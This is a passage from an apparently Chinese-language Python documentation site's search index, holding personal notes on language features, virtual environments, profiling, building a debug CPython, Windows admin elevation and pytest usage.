多个变量的赋值 创建一个整型对象，值为1，三个变量被分配到相同的内存空间上: a = b = c = 1 a,b,c分别被赋值为1,2，\"john\": a, b, c = 1, 2, \"john\" Python 五个标准的数据类型 Numbers:    数字 String:     字符串 List:       列表 Tuple:      元组 Dictionary: 字典 Python支持四种不同的数字类型 int:      有符号整型 long:     长整型，也可以代表八进制或者十六进制 float:    浮点型 complex:  复数 python2.2之后int溢出后会自动自动转换为long，3中long被移除 在python中类型属于对象，变量是没有类型的 字符串的操作 截取字符串: str = 'hello'\nprint str[1:4]                                #ell\n# str[start:end],从下标start开始，end结束，不包括end 将字符串转换为数组: str = 'hi yo'\nprint str.split()                     #['hi', 'yo']\n# split，以指定字符串分隔, 不带参默认是空格 获取对象占用的内存大小 sys.getsizeof() 获取对象占用的内存大小 sys.modules sys.modules是一个全局字典，该字典是python启动后就加载在内存中，\n每当导入新的模块，sys.modules都将记录这些模块。 字典sys.modules对于加载模块起到了缓冲的作用。\n当某个模块第一次导入，字典sys.modules将自动记录该模块。\n当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。 sys.argv[] sys.argv[0]表示代码本身文件路径以及调用时的参数 sys.argv[]说白了就是一个从程序外部获取参数的桥梁，\n这个\"外部\"很关键，所以那些试图从代码来说明它作用的解释一直没看明白。\n因为我们从外部取得的参数可以是多个，所以获得的是一个列表（list)，\n也就是说sys.argv其实可以看作是一个列表，所以才能用[]提取其中的元素。\n其第一个元素是程序本身，随后才依次是外部给予的参数: sys.argv[num]         #调用时的第num个参数，0表示脚本本身 四舍五入 code: format(1.23456, '.2f')\n\n'%.4f' % 1.23456 还有一个 round 不是很建议, 除非对精度无要求 获取集合中最大/小的N个元素 如果 N == 1, 那么还是使用 min(), max() 好点 N > 1 时, 使用 heapq 的: heapq.nlargest(n, iterable, key=None)  获取最大n个元素 heapq.nsmallest(n, iterable, key=None) 获取最小n个元素 字典的一些不常见操作 例: a={\n'x' : 1,\n'y' : 2,\n'z' : 3 }\nb={\n'w' : 10,\n'x' : 11,\n'y' : 2 } 操作: # Find keys in common\na.keys() & b.keys()\n# { 'x', 'y' }\n# Find keys in a that are not in b\na.keys() - b.keys()\n# { 'z' }\n# Find (key,value) pairs in common\na.items() & b.items()\n# { ('y', 2) } 一个字典就是一个键集合与值集合的映射关系。字典的 keys() 方法返回一个展现 键集合的键视图对象。\n键视图的一个很少被了解的特性就是它们也支持集合操作，比如 集合并、交、差运算。\n所以，如果你想对集合的键执行一些普通的集合操作，可以直接 使用键视图对象而不用先将它们转换成一个 set。 字典的 items() 方法返回一个包含 (键，值) 对的元素视图对象。\n这个对象同样也 支持集合操作，并且可以被用来查找两个字典有哪些相同的键值对。 尽管字典的 values() 方法也是类似，但是它并不支持这里介绍的集合操作。\n某种 程度上是因为值视图不能保证所有的值互不相同，这样会导致某些集合操作会出现问题。\n不过，如果你硬要在值上面执行这些集合操作的话，你可以先将值集合转换成 set， 然后再执行集合运算就行了。 序列中出现次数最多的元素 collections.Counter 见 collections 下划线 在Python中，下划线（underscore）有多种用途，包括： 单个前导下划线： _var ，表示该变量是一个私有变量，建议不要在类的外部直接访问。 单个结尾下划线： var_ ，避免与Python关键字或内置函数冲突。 双前导下划线： __var ，表示该变量是一个强制私有变量，不能在类的外部直接访问。在类内部通过`self.__var`的方式访问。 双前导和双结尾下划线： __var__ ，表示Python内置的方法或属性，避免与自定义方法或属性发生冲突。 单个独立下划线： _ ，作为占位符使用，表示某个变量或参数没有被使用。\n在交互式界面中, 默认表示最近一次的值. 需要注意的是，在Python中使用下划线并不是强制性的，而只是一种编码规范。但是，遵守这些规范可以提高代码的可读性和可维护性。 特别的, 在python交互式控制台中, 单下划线表示上一个语句的返回值. 判断类型注解是否属于typing 判断类型注解是否引入了typing <an_is_typing> 关于数据类型模块使用注解 当使用 dataclasses 模块时,\n可能会用到 typing 注解. 当需要获取注解的相关信息时, 可以使用 fields 函数: @dataclass\nclass Person(object):\n  name: str\n  pet: List[Cat] = field(default_factory=list)\n  pet2: Cat = field(default_factory=Cat)\n\nfrom typing import _GenericAlias\n\nfor f in fields(Person):\n  print('type', f.type) 返回结果是 typing.Field 的一个迭代 一些内置类型的注解 比如 函数类型的注解, 可以使用 types 下的定义,\n如: def _fun(): ...\n\nimport types\nassert types.FunctionType == type(_fun) 判断是否是协程函数, 调用后可以使用 Awaitable,\n未调用时只能使用 import asyncio\nasyncio.iscoroutinefunction() 实际会调用 inspect 模块下的 iscoroutinefunction Python定义抽象类/接口类 见 Python_抽象/接口类 使用 abc 会定义的抽象类会强制进行类型检查,\n并不建议使用强制类型检查, 因为Python是一门动态语言, 这样不但降低性能, 而且显得舍本逐末. 可以直接按照普通的定义, 抽象基类直接抛异常即可: class IBase(object):\n\n  def method1(self):\n    raise NotImplemented 快速实现比较方法 不想全部定义object比较的方法, 可以使用 functools 下的 total_ordering 装饰器 这样只需要定义任意一个比较方法, 就可以实现完整的比较. 不过性能较慢, 所以如果不是强需求的话, 还是手动都实现了吧, 实在不行, 定义个比较基类实现就行 判断语句 看这个例子: def fun(*args, **kwargs):  return not (args or kwargs)\ndef fun2(*args, **kwargs): return not args and not kwargs 当我没说... 进制说明 八进制以 0o 开头, 如: 0o755 进制转换见 Python_进制转换 同名类属性/实例变量与属性访问器(Property)的访问顺序 类属性: 定义类时定义的属性 实例属性: 类实例化后设置的属性 属性访问器: 使用 @property 修饰的属性方法 结果: 对于已经实例的对象而言, 优先查找@property属性访问器 注意: 如果定义同名的实例属性与属性访问器, 必须设置属性访问器的setter方法, 否则会报错.\n若定义的类属性需要支持设置值时, 也需要设置, 否则报错. 如, 同名实例属性与属性访问器: class A(object):\n    def __init__(self):\n        self.name: str = '123'\n\n    @property\n    def name(self):\n        return 'nnn'\n\nif __name__ == '__main__':\n    a = A()\n    print(a.name) 报错: self.name: str = '123'\nAttributeError: can't set attribute 同名类属性与属性访问器(不支持设置类属性值): class A(object):\n    name: str = '123'\n\n    @property\n    def name(self):\n        return 'nnn'\n\nif __name__ == '__main__':\n    a = A()\n    print(a.name) 结果: nnn","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Some-use-skills,-explanation.html","loc":"/yq-docs-rear-end-python-Concept-Some-use-skills,-explanation.html"},{"title":"特殊字符","text":"部分特殊字符: \\n\n  换行符, 光标移到下一行开头\n\\r\n  一般用于单行进度之类, 光标移动到当前行开头","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Special-characters.html","loc":"/yq-docs-rear-end-python-Concept-Special-characters.html"},{"title":"对super的理解","text":"前言 Python的super常用于继承. 关于继承, 又不得不提到经典类与新式类. Python2.x 都是经典类 Python3.x 是新式类, 注意需要继承自 object 对于子类的某一个调用, 经典类会深度优先搜索的区寻找执行, 而新式类是广度优先搜索执行\n(这里有个坑, 算不上真正的广度优先, 实际上主要还是参考MRO的实现, 不过最后一个找的一般都是object,\n或者说公共父类往往在此父类所有子类都找了后再找). 关于方法的执行顺序, 可以调用其 _mro_ 属性(method resolution order)查看继承顺序. 注解 关于 MRO的实现, 在网上看到一篇还可以的解释: MRO的实现, 可略微参考, 最后的计算看起有点问题. 更具体的还是去参考官方了. 新式类的搜索顺序更像是先深度, 但是把 object 这种公共顶层 放最后. super使用 在继承时, super可用于实现父类方法 class A ( object ): def eat ( self ): print ( 'A eat' ) class B ( A ): def eat ( self ): # 此处 super().eat() 与 super(B, self).eat() 效果一致 super () . eat () print ( 'B eat' ) 注解 super 如果带参数, 实际测试只有 ($class, self) 的形式才有效果, 会从 $class 开始向上找基类方法执行. 另外必须使用 super() 的形式, 也就是必须用其对象, 否则会报错没有属性.","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Understanding-of-super.html","loc":"/yq-docs-rear-end-python-Concept-Understanding-of-super.html"},{"title":"python导入说明","text":"跟踪导入 在 Python 中，import 语句用于导入模块和组件。\n当编写一个 Python 程序时，通常需要使用许多不同的模块和库来完成某些任务。 在考虑将程序编译为可执行文件时，就需要考虑如何处理这些依赖项。\n如果不包括所有必要的依赖项，则可能会导致生成的可执行文件无法正常运行。 跟踪导入是指编译器在编译过程中自动查找和包含程序所需的所有依赖项. 例如，如果一个 Python 脚本依赖于 numpy 库，则编译器应该能够自动识别并包含 numpy 库。 一些编译器（如 Nuitka）具有特定的选项，以便在编译过程中跟踪和包含依赖项。\n这样可以确保生成的二进制文件包含程序的所有必需部分，并且可以在没有任何其他安装或配置的情况下运行程序。 总之， 跟踪导入是指在编译程序时跟踪和包含所有依赖项，以便生成一个完整的、独立的可执行文件","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-python-introduction-description.html","loc":"/yq-docs-rear-end-python-Concept-python-introduction-description.html"},{"title":"python虚拟环境","text":"部分说明可见: 创建Python虚拟环境 涉及到一个模块 pyvenv 创建虚拟环境: python -m venv <虚拟环境名> venv 支持的选项 --system-site-packages 是否使用全局环境的第三方库, 默认否 --without-pip 不安装pip, 默认会装 --clear 如果创建虚拟环境的目录已经有了其他虚拟环境，删除重建 会默认在当前环境下创建一个虚拟环境.\n是否使用系统的包等信息配置在此目录下的 pyvenv.cfg 文件里,\n其中: home 表示环境变量, python相关的一些指令就是从这个环境变量指定的目录下找 导入虚拟环境: source 虚拟环境名/bin/active\n. 启动 启动 # 当前目录下存在名为 venv_test_env 的虚拟环境 . venv_test_env/bin/activate 关闭 关闭 # 当前目录下存在名为 venv_test_env 的虚拟环境 # deactivate 默认已经写到环境变量里面了, 记得如果有用shell, 使用时不要覆盖此函数 deactivate","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-python-virtual-environment.html","loc":"/yq-docs-rear-end-python-Concept-python-virtual-environment.html"},{"title":"cProfile","text":"cProfile是Python标准库中内置的性能分析模块，C扩展，非侵入式，不需要修改代码。 使用方法: python -m cProfile [-s sort_order] myscript.py ` -s 指定输出的排序方法，可以传入tottime或者cumtime tottime表示该函数本身的执行时间，不包括该函数调用的子函数 cumtime表示该函数累计执行时间，包括该函数调用的子函数 输出列含义 ncalls是每个函数被调用次数 tottime表示该函数本身的执行时间，不包括该函数调用的子函数 第一个percall表示tottime / ncalls cumtime表示该函数累计执行时间，包括该函数调用的子函数 第二个percall表示cumtime / primitive calls，primitive calls 表示除去递归后本函数被调用次数 filename:lineno(function)表示函数所在的文件名，行号和函数名 cProfile是一种Deterministic Profiling.\nDeterministic Profiling是指记录所有函数每次的执行状况，而不是通过采样的方式来记录.\n通过采样的方式，性能开销会更小，但是记录可能会不够准确. 生成火焰图 使用 -o 选项生成cProfile的二进制性能结果: python -m cProfile [-o output_file] myscript.py 再用 flameprof 生成火焰图: flameprof requests.prof > requests.svg 图分成上下两部分，上部的图是按照函数调用栈和执行时间排列;\n下部反方向的图按照函数执行时间比例从大到小排列. 上部的图中execute是最顶层的函数，往上是它调用的子函数，直到调用链最底层的函数;\n宽度表示每个函数的执行时间占用的比例，越宽表示越耗时.","tags":"后端; python","url":"/yq-docs-rear-end-python-Performance-analysis-cprofile.html","loc":"/yq-docs-rear-end-python-Performance-analysis-cprofile.html"},{"title":"pyflame","text":"uber开源的一款工具，利用ptrace生成渲染图，用于分析性能瓶颈 地址: https://github.com/uber/pyflame","tags":"后端; python","url":"/yq-docs-rear-end-python-Performance-analysis-pyflame.html","loc":"/yq-docs-rear-end-python-Performance-analysis-pyflame.html"},{"title":"Python 判断某个类包含的类方法","text":"使用 types 与 isinstance class ITest ( object ): def get_one ( self ): raise NotImplemented def get_two ( self ): raise NotImplemented # 注意类方法是 FunctionType #   实例方法是 types.MethodType functions_ = [ k for k , v in ITest . __dict__ . items () if isinstance ( v , types . FunctionType )] print ( functions_ ) # ['get_one', 'get_two']","tags":"后端; python","url":"/yq-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html","loc":"/yq-docs-rear-end-python-Related-technology-implementation-Determine-whether-it-is-a-class-method.html"},{"title":"获取win下管理员权限","text":"判断是否有管理员权限: import ctypes\n'is admin' if ctypes.windll.shell32.IsUserAnAdmin() else 'not admin' 涉及到win API: IsUserAnAdmin 获取管理员权限: ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1) 参数解析: runas 表示以管理员权限执行\nsys.executable 表示打开的执行文件. 这里一般都在python内跑就是 python.exe (python的安装路径)\n__file__ 执行文件跟的参数 注解 如果是python2, 那么 sys.executable , __file__ 都需要加上 unicode, 如 unicode(__file__) sys.version_info[0] == 3 判断python版本是否是 3 涉及到win API: shellExecuteW","tags":"后端; python","url":"/yq-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html","loc":"/yq-docs-rear-end-python-Related-technology-implementation-Get-the-administrator-permissions-under-WIN.html"},{"title":"在一个Python环境使用另一个Python环境的包","text":"仅针对三方包. 需求: 当使用一个虚拟环境时, 想导入另一个虚拟环境的三方包 主要有两种解决方案 手动安装需要的包 : 使用 pip freeze 导出另一个虚拟环境的三方包信息到 requirements.txt, 然后手动安装 配置环境变量PYTHONPATH : 将另一个虚拟环境的三方包加入到环境变量 PYTHONPATH 手动安装需要的包 大致: source /path/to/venv_b/bin/activate\npip freeze > /path/to/requirements.txt\nsource /path/to/venv_a/bin/activate\npip install -r /path/to/requirements.txt 注解 不确定直接: sys.path.insert(...) 是否可行, 有时间实验一下 配置环境变量PYTHONPATH 找到另一个虚拟环境的三方包目录: source /path/to/venv_b/bin/activate\npython -c \"import site; print(site.getsitepackages())\" 将虚拟环境b的 site-packages 目录添加到 PYTHONPATH 环境变量中(也可以直接在Python的os.environ中设置): export PYTHONPATH=$PYTHONPATH:/path/to/venv_b/lib/pythonX.Y/site-packages 在虚拟环境a中调用虚拟环境b的包: source /path/to/venv_a/bin/activate\npython\nimport module_name","tags":"后端; python","url":"/yq-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html","loc":"/yq-docs-rear-end-python-Related-technology-implementation-Use-a-package-of-another-Python-environment-in-one-Python-environment.html"},{"title":"高级Python","text":"主要对Python中支持的操作做一个归纳总结. 生成器效率高于推导式 字符串操作 普通字符串, 直接使用内置的: split   转换为数组\nreplace 替换字符\nfind    查找字符位置 使用 re 模块: re.sub      使用正则替换\nre.match    从字符串开始匹配\nre.findall  查找所有匹配的字符串 注意: 使用正则时候的贪婪匹配与非贪婪匹配 . 表示除换行外的任意字符 () 表示分组 ?: 大量匹配, 是用 re.compile 先预编译 元祖转换对象","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Advanced-Python.html","loc":"/yq-docs-rear-end-python-Tutorial-Advanced-Python.html"},{"title":"debug版本python安装","text":"参考: https://docs.python.org/zh-cn/3.11/using/unix.html 找了一下资料, debug版本只有windows可以通过安装包安装,\n其他如linux、mac等都得手动编译安装. Mac下的安装 基本指令: wget https://www.python.org/ftp/python/3.9.10/Python-3.9.10.tgz\ntar -xzf Python-3.9.10.tgz\ncd Python-3.9.10\n./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10  --with-openssl=/usr/local/opt/openssl@1.1 --with-lto\nmake -j8 && sudo make altinstall --with-pydebug参数会编译带有debug符号的二进制文件,方便后期使用gdb进行调试 --enable-optimizations 用 PROFILE_TASK 启用以配置文件主导的优化（PGO）（默认为禁用）.\nC 编译器 Clang 需要用到 llvm-profdata 程序进行 PGO。在 macOS 上，GCC 也需要用到它：在 macOS 上 GCC 只是 Clang 的别名而已。\n如果使用 --enable-shared 和 GCC ，还可以禁用 libpython 中的语义插值：在编译器和链接器的标志中加入 -fno-semantic-interposition 。 --prefix指定安装路径 --with-openssl指定openssl的路径, 否则ssl模块无法使用 --with-lto: 启用链接时优化（Link Time Optimization，简称LTO）。\n链接时优化是一种编译器优化技术，通过在链接阶段对代码进行全局分析和优化，可以提高程序的性能。\n在启用LTO时，编译器将生成中间表示形式（IR）并将其保存到目标文件中。\n然后，在链接阶段，通过对所有目标文件中的IR进行深度优化和分析，以及整体代码重排和消除冗余等操作，生成最终可执行文件或库。 configure支持的参数可查看: https://docs.python.org/zh-cn/3.11/using/configure.html make相关: make ：用标准库构建Python, -j8表示8个任务并行安装 make clean ：移除构建的文件 make distclean ：与 make clean 相同，但也删除由配置脚本创建的文件 警告 make install 可以覆盖或伪装 python3 二进制文件(系统默认的python3)。\n因此，建议使用 make altinstall 而不是 make install ，\n因为后者只安装了 exec_prefix/bin/pythonversion 。 后续遇到的问题 使用nuitka编译时, 有时候源码能跑过的, 构建出来跑不了,\n所以研究了一下对于构建好的应用, 能否在Python的层面进行调试,\n结果似乎不能,\n虽然意外发现有nuitka一个 --python-debug 选项, 也只能实现编译后\n的文件保留了原有的行号变量等信息, 最终还是得gdb(mac下lldb)出手.\n可参考: nuitka .\n不过需要安装支持debug的python版本, 也就是编译安装python\n时需要添加 --with-pydebug 选项... 最开始使用上述流程安装好python时候, python使用没问题,\n使用nuitka构建的时候出现报错: Undefined symbols for architecture x86_64:\n  \"_libintl_bindtextdomain\", referenced from:\n      fish_bindtextdomain(char const*, char const*) in libfishlib.a(fallback.cpp.o)\n  \"_libintl_gettext\", referenced from:\n      fish_gettext(char const*) in libfishlib.a(fallback.cpp.o)\n  \"_libintl_textdomain\", referenced from:\n      fish_textdomain(char const*) in libfishlib.a(fallback.cpp.o)\nld: symbol(s) not found for architecture x86_64\nclang: error: linker command failed with exit code 1 (use -v to see invocation) 类似这样, 最开始查了一下以为是gettext库不对(在这之前已经安装了gettext),\n以为出现找不到 _libintl, 是没设置好环境变量, 就设置了一下并重新编译安装: export LDFLAGS=\"-L/usr/local/opt/gettext/lib\"\nexport CPPFLAGS=\"-I/usr/local/opt/gettext/include\" libintl 是 gettext 的一部分。gettext 是一个用于国际化和本地化的工具集，\n它提供了一种方式来在应用程序中从源代码中提取文本，并将其翻译成不同的语言。\nlibintl 是 gettext 提供的一个库，用于处理多语言文本的运行时支持，\n包括翻译、格式化和字符编码等功能。通过使用 libintl，开发人员可以轻松地实现多语言支持的应用程序。 结果还是发现有问题, 后面试过给nuitka加参数, 指定 LD_LIBRARY_PATH 等, 都失败了. 然后突然想起看一下动态库的链接是啥(linux下是ldd, mac默认没有, 有个相似的otool),\n编译安装的debug版本如下: $ otool -L  /usr/local/python/python3.9.10/bin/python3.9\n/usr/local/python/python3.9.10/bin/python3.9:\n  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0)\n  /usr/local/opt/gettext/lib/libintl.8.dylib (compatibility version 12.0.0, current version 12.0.0)\n  /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 又去找了一个正常的看: $ readlink -f  `which python3`\n/usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11\n\n$ otool -L /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11\n/usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/bin/python3.11:\n  /usr/local/Cellar/python@3.11/3.11.4_1/Frameworks/Python.framework/Versions/3.11/Python (compatibility version 3.11.0, current version 3.11.0)\n  /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 一对比, 编译安装的多了个 /usr/local/opt/gettext/lib/libintl.8.dylib , ls查看了一下位置,\n路径没问题啊, 为什么会这样?\n百度无果, 开墙, 谷歌, 终于在github发现了类似的一个问题,\n不过是由 CMAKE 引起, 参见: https://github.com/fish-shell/fish-shell/issues/5244 , CMAKE 也有说明有其他地方已经提出: https://gitlab.kitware.com/cmake/cmake/-/issues/18921 , 现在这问题四年了还没关. 有位大佬在19年已经说明好问题了: I can reproduce this - looks like I've got the Mono libintl, and if I add the brew gettext tools to my path, I get the same problem.\n\nI have spent some time reviewing the current state:\n\n- libintl is not shipped in macOS, but can be picked up by FindPackage(Intl)\n- the gettext binaries (msgfmt etc) are not shipped in macOS, but can be picked up by FindPackage(gettext)\n- if both libintl and the gettext binaries are detected, the include directories get added to the global include directories\n- regardless of the gettext state, the libintl libraries are added to the list of library dependencies of the fishlib target (this is inconsistent with the previous item and probably needs fixing, perhaps through an add_library target)\n\nIf you have Mono installed, libintl's headers are picked up by CMake from /Library/Frameworks/Mono.framework, but the libraries are not found in the same prefix (Intl_LIBRARY:FILEPATH=Intl_LIBRARY-NOTFOUND). Unfortunately, this cannot be used as a signal that libintl is not available, because this is exactly the state that glibc is in with libintl compiled into the main library.\n\nThis is only exposed as a problem when gettext is in the path, because of the requirement for both gettext and libintl for the include_directory call (as above).\n\npkg-config would not help here, because it does not ship on macOS.\n\nI think this is a bug in CMake's FindIntl module, which I'll report to them. Someone has a similar problem in EOSIO/eos#1539.\n\nFor now, you can work around this either by turning off the use of translation (cmake -DWITH_GETTEXT=0), or enable it by adding an additional library search path (cmake -DCMAKE_LIBRARY_PATH=/Library/Frameworks/Mono.framework/Libraries). 简而言之就是, 因为brew手动安装了gettext, 同时系统也安装了Mono(一个.Net的什么框架), 然而Mono下\n已存在libintl库, 这个时候系统内就有两个地方存在这个库了.\n然后编译安装Python时, 会自动探测包位置, brew包管理器发现了有gettext这个包, 所以就使用了,\n但是, 用的这个又多了一些东西(暂且这么说, 实际编译时不需要这些), 就导致了使用nuitka时的报错\n(他这里虽然是CMAKE, 但是原因是一致的).\n而且后面fish-shell处理了这问题: https://github.com/fish-shell/fish-shell/commit/970a963896162617af3e18fb2df953dbeac0a4fc 注解 我就很诧异, 没其他人遇到这个问题吗... 看了一下我的 /Library/Frameworks/Mono.framework 下面, 果然已经有一个 libintl.8.dylib ,\n所以自己brew安装的gettext就是个多余的, 导致编译安装好的python多了个自安装的libintl动态库链接,\n尝试过手动指定路径没找到方法, 最后 brew uninstall gettext 后再重新编译安装后解决: sudo make clean\nsudo make distclean\nsudo rm -rf /usr/local/python/python3.9.10\n./configure --enable-optimizations --with-pydebug --prefix=/usr/local/python/python3.9.10  --with-openssl=/usr/local/opt/openssl@1.1\nsudo make -j8 && sudo make altinstall 查看链接位置: $ otool -L  /usr/local/python/python3.9.10/bin/python3.9\n/usr/local/python/python3.9.10/bin/python3.9:\n  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 1971.0.0)\n  /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1319.100.3) 正常了","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html","loc":"/yq-docs-rear-end-python-Tutorial-DEBUG-version-python-installation.html"},{"title":"从源码安装Python","text":"主要是针对发布版本的Linux吧, 比如Ubuntu, 使用: apt install python3 会发现安装的是跟当前对应的版本, 比如20就是Python3.8. 要安装其他版本的Python就只有源码安装了, 官网源码下载 <https://www.python.org/downloads/source/> 如果看其他平台适用: https://www.python.org/downloads/ 源码安装一般分3步: 配置 configure 编译 make 安装 make install 可参考官网开发手册: Linux构建安装Python 前置依赖准备: sudo apt install build-essential gdb lcov pkg-config \\\n      libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\\n      libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\\n      lzma lzma-dev tk-dev uuid-dev zlib1g-dev python-dev 注解 官网并没提到要安装python-dev, 实际如果缺失会导致使用struct模块报错找不到_struct 创建安装目录, 创建/usr/local/python37作为安装目录 mkdir /usr/local/python37 配置: ./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations --prefix=/opt/python3.9用来指定安装位置 --with-pydebug添加调试工具用 --enable-optimizations对编译结果进行优化，提高运行效率，但会增加编译时间 编译: make 可以使用 -j 参数指定CPU个数进行并行编译 检查编译: make test 安装: sudo make altinstall 也可使用install，代价是它可能会更改自带的python3安装，使得卸载变得困难，甚至使自带的python3变得不可用 总结, 所有指令 : sudo apt install build-essential gdb lcov pkg-config \\\n      libbz2-dev libffi-dev libgdbm-dev libgdbm-compat-dev liblzma-dev \\\n      libncurses5-dev libreadline6-dev libsqlite3-dev libssl-dev \\\n      lzma lzma-dev tk-dev uuid-dev zlib1g-dev\nsudo mkdir /usr/local/python37\n./configure --prefix=/usr/local/python37 --with-pydebug --enable-optimizations\nmake -j 3\nsudo make altinstall 使用源码安装最麻烦的是依赖包处理. 比如Ubuntu20, 官方源的Python绑定是3.8的版本. 如果\n想要安装Python3.7, 那么你会发现至少缺少Python3.7-dev, 且源里面没有也下载不了. 注: python-dev or python-devel 称为 Python 的开发包，包括了一些用 C / Java / C# 等编写的 Python 扩展，\n在编译的时候依赖的头文件等信息。在编译一个用 C 语言编写的 Python 扩展模块时，\n里面会有 #include<Python.h> 这样的语句，因此需要先安装 python-dev or python-devel 开发包. 这种情况下要么换个有此包的源然后下载, 但是可能也会有其他依赖包版本问题, 要换直接去支持版本的机器上\n全量编一个. Ubuntu 下名称 python-dev and python3-dev CentOS 下名称 python-devel and python3-devel 关于动态库链接处理 当时候从其他机器编译的Python时, 若需要的动态库在本机不存在, 还需要处理\n动态库链接, 有几种方式(任选其一): 将so文件所在目录如 /usr/local/lib 添加到 /etc/ld.so.conf 并运行ldconfig.\n当然，这是系统范围的设置. 将动态链接库文件(.so文件)复制到/usr/local/lib 或 /usr/lib,\n然后执行 sudo ldconfig 更新系统动态链接库缓存. 将共享库放在统一的位置如 path/to/libs,\n然后将其加入环境变量: export LD_LIBRARY_PATH=path/to/libs:$LD_LIBRARY_PATH 如果要永久生效就需要加到如 /etc/profile 打印 LD_LIBRARY_PATH 的值, 会发现 /usr/local/lib 或 /usr/lib 并不在这个\n变量中, 这是因为, 这两目录是默认的共享库搜索路径.\n即使未将该目录添加到 LD_LIBRARY_PATH 环境变量中，操作系统也会自动搜索该目录以查找所需的共享库 警告 对于Ubuntu等, /usr/bin/python 是与其他指令息息相关的, 比如 pip, lsb-release 等.\n所以若自定义源码安装的版本与自带版本不一致时, 最好还是采用设置环境变量来处理执行命令的问题,\n而不是直接修改 /usr/bin/python 的链接地址.","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html","loc":"/yq-docs-rear-end-python-Tutorial-Installation-from-the-source-code.html"},{"title":"Pytest使用","text":"搜索范围 先找到当前目录下以test_为前缀和以_test为后缀的文件, 然后在其中搜索: 以test为前缀的函数 以Test为前缀的类(注意一般测试类不应包含__init__()函数)中以test为前缀的函数 继承unittest.TestCase单元测试类中, 以test为前缀的函数 选项参数 -v , -q 打印用例执行的详细/简略过程, pytest -v , pytest -q -k 指定具体执行哪一个测试用例, 可以是文件名, 也可以是函数名, 都有则需要严格指定py文件名 -x 测试用例执行失败则立刻停止 -s 需要执行 print 函数, 默认不执行 -r <option> 生成简略的指定需求的报告, 支持参数如下 option Des f failed E error s skipped x xfailed X passed P passed p passed with output a all except passed A all --tb= <option> option: 'auto', 'long', 'short', 'no', 'line', 'native' 用例运行失败时, 展示错误的详细程度 -l , --showlocals 用例运行失败时, 打印相关的局部变量, pytest -l --lf , --last-failed 只执行上次执行失败的测试 --ff , --failed-first 先执行完上次失败的测试后, 再执行上次正常的测试 --durations= <num> num为0时则倒序显示所有的用例, 为具体值则显示耗时最长的对应该数量的用例, -vv 显示持续时间为0秒的用例 会按用例执行耗时时长：从长到短 显示结果, 用于调优测试代码 比如显示运行耗时最长的3个用例且包含持续时间为0秒的：pytest --durations=3 -vv --maxfail= <num> 用例运行时 允许的最大失败次数, 超过则立即停止, pytest --maxfail=3 --collect-only 收集测试用例但不执行 -n <num> 当使用pytest-xdist插件时, 可以指定运行处理器进程数, 可为个数或者'auto' --cov= <path> 统计指定路径的代码测试覆盖率, 需要先安装cov模块: pip install pytest-cov --cov-report= <TYPE> 生成指定格式的测试报告, 支持多个值, 支持以下测试报告类型: term, term-missing, annotate, html, xml 技巧 运行指定的函数 pytest 模块名::类名::函数名, pytest test.py::check_ui 注解 代码内部执行 if __name__ == '__main__' : pytest . main () 支持的装饰器 @pytest.mark.run(order=x) 表示执行顺序 @pytest.mark.parametrize('param1, param2', [(param1_data[0], param2_data[0]),(param1_data[1], param2_data[1])]) 存在需要传入多次参数使用 @pytest.fixture(name='xxx', scope='function', autouse=False) 将标记函数设为固件, 直接作为参数使用, name可设置别名, scope设置生效范围,\nautouse设置是否显示使用(即若设置为True, 及时不直接引用, 也会调用到) 如果有多个固件, 则会按顺序执行 scope支持参数: session     实现多个.py跨文件使用一个session来完成多个用例 module      实现多个.py跨文件共享前置, 每一个.py文件调用一次 class               每一个类运行前调用一次 function    每一个函数或方法运行前都会调用 可控制作用范围：session>module>class>function @pytest.mark.skip(reason='xxx') 跳过测试(如果需要函数内部使用, 直接`pytest.skip(...)`) @pytest.mark.skipif(condition='1>2', reason=\"xxx\") 含条件判断的跳过 @pytest.mark.asyncio 标记为异步测试函数, 标记后才能正常执行该异步函数 @pytest.mark.xfail(reason='xxx') 标记为预期失败 支持的其他 rerunfailure\n失败重跑 安装, pip install pytest-rerunfailure 在设置文件pytest.ini中添加命令\nreruns = 重跑次数\naddopts= --reruns =10 参见: pytest-rerunfailures 使用Mock模拟对象 使用mock对象替代掉指定的python对象, 以达到模拟对象的行为的目的。 可以用在测试时, 存在一些依赖对象时, 使用mock模拟一些依赖对象; 也可以用在存在接口调用但接口未完善时. from unittest.mock import Mock something = Mock () something . do = lambda * args : True 其他见: pytest 关于装饰器的一些使用 有此节主要是因为, 有需求需要将一个固件重用, 但是变动的地方很小 引入需要用到的模块: import pytest\nfrom _pytest.fixtures import SubRequest\nfrom _pytest.mark import Mark 定义一个r_server固件, 作用范围为方法域, yield表示会先在yield处返回给测试函数执行直到其结束: @pytest.fixture(scope='function')\ndef r_server(request: SubRequest):\n    print()\n    k_kwargs = {k: v for k, v in request.keywords.items()}\n    print(\n        f'keywords: {k_kwargs}',\n          